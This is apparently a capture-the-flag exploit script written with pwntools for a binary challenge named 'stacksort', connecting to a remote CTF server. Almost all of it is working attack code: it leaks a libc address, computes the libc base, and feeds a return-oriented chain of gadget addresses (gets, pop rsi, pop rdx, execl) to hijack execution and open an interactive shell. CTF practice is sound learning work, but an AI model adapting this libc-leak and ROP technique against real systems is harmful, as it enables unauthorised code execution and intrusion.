from pwn import *
from tqdm import tqdm
import atexit

if args.REMOTE or args.GDB:
    name = "./stacksort"
    context.binary = file = ELF(name)
else:
    name = "./patched"
    context.binary = file = ELF(name)

libc = ELF("./libc.so.6")
context.terminal = ["kitty"]
gdbscript = """
# b malloc
# b qsort
b execl
b *main+0xcc
c
"""

if args.GDB:
    p = remote("localhost", 5000)
    p.recv(1)
    with open("gdbinit", "w+") as fp:
        fp.write(gdbscript + "\n")
    g = process("kitty gdb -x gdbinit ./stacksort -p $(pgrep run)", shell=True)
    def cleanup():
        g.close()
    atexit.register(cleanup)
    sleep(3)
elif args.REMOTE:
    p = remote("challs.actf.co", "31500")
else:
    p = gdb.debug(name, gdbscript=gdbscript)

main = file.sym.main
main_skip_prologue = 0x00401283
stack_pivot = file.got.strtoul + 0x810
mask = (1 << 40) - 1 & ~0xffffffff
print(len(str(mask)))

rets = [0x00401104]
printf = 0x004010a0

for i in tqdm(range(49)):
    p.sendafter(b": ", f"{0x0040101a}\n".encode())
for i in tqdm(range(1)):
    p.sendafter(b": ", f"{printf}\n".encode())
for i in tqdm(range(256-49-1)):
    p.sendafter(b": ", f"{file.sym.main}\n".encode())

leak = u64(p.recv(6).ljust(8, b"\x00"))
libcbase = leak - 0x21b150
log.info(f"{libcbase = :#x}")

ret = libcbase + 0x000eb84e
poprsi = 0x0000000000092a63
poprcx = 0x000000000008c6bb
poprdx = 0x00000000000904a9

print(len(str(libcbase + libc.sym.gets)))
print(len(str(libcbase + libc.entrypoint)))

# for i in tqdm(range(256)):
#     p.sendafter(b": ", f"{libcbase + libc.entrypoint}".encode())

for i in range(21):
    p.sendafter(b": ", f"{libcbase + libc.sym.gets}".encode())
for i in range(1):
    p.sendafter(b": ", f"{libcbase + poprsi}".encode())
for i in range(1):
    p.sendafter(b": ", f"{libcbase + poprsi + 1}".encode())
# for i in range(1):
#     p.sendafter(b": ", f"{libcbase + poprcx}".encode())
# for i in range(1):
#     p.sendafter(b": ", f"{libcbase + poprcx + 1}".encode())
for i in range(1):
    p.sendafter(b": ", f"{libcbase + poprdx}".encode())
for i in range(2):
    p.sendafter(b": ", f"{libcbase + poprdx + 1}".encode())
for i in tqdm(range(256-21-2-3)):
    p.sendafter(b": ", f"{libcbase + libc.sym.execl}".encode())

# 0x57e20
# 0xc2cf0

p.sendline(b"meow")
p.sendline(b"/bin0sh")

p.interactive()
